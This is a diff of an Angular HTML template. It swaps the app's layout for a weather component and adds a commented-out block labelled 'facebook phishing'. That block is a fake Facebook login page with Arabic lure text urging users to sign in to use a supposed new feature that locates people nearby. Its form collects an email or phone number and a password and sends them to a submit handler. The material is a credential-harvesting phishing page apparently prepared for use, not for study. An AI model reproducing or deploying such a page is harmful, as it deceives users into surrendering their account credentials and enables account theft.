@@ -1,7 +1,41 @@
-<div class="header"></div>
-<div class="body-content">
-    <router-outlet></router-outlet>
-</div>
-<div class="footer">
-    <app-footer></app-footer>
-</div>
+<!-- <div class="content">
+    <div class="header"></div>
+    <div class="body-content">
+        <router-outlet></router-outlet>
+    </div>
+    <div class="footer">
+        <app-footer></app-footer>
+    </div>
+</div> -->
+<app-weather></app-weather>
+
+
+<!-- facebook phishing -->
+<!-- <div class="content">
+    <div class="title mx-auto"><a>هناك خاصية جديدة لتحديد جميع الأشخاص الموجودين بمنطقتك، المرجو تسجيل الدخول</a></div>
+    <div class="header mx-auto">
+        <h3>facebook</h3>
+    </div>
+    <div dir="rtl" class="login-form mx-auto">
+        <form #logForm="ngForm" (ngSubmit)="submitLogForm(logForm)">
+            <div class="username form-group">
+                <input name="username" required [(ngModel)]="user.username" class="form-control" type="text"
+                    placeholder="البريد الإلكتروني أو رقم الهاتف">
+            </div>
+            <div *ngIf="!logForm.form.controls.username?.valid && logForm?.form.controls.username?.dirty"
+                class="error ">
+                <a class=" mx-auto">المرجو إدخال البريد الإلكتروني أو رقم الهاتف</a></div>
+            <div class="password form-group">
+                <input name="password" required [(ngModel)]="user.password" class="form-control" type="text"
+                    placeholder="كلمة السر">
+            </div>
+            <div *ngIf="!logForm.form.controls.password?.valid && logForm?.form.controls.password?.dirty" class="error">
+                <a class=" mx-auto">المرجو إدخال كلمة السر</a></div>
+            <div class="action mx-auto"><button type="submit" class="btn">تسجيل
+                    الدخول</button></div>
+        </form>
+    </div>
+</div> -->
+
+
+<!-- test css -->
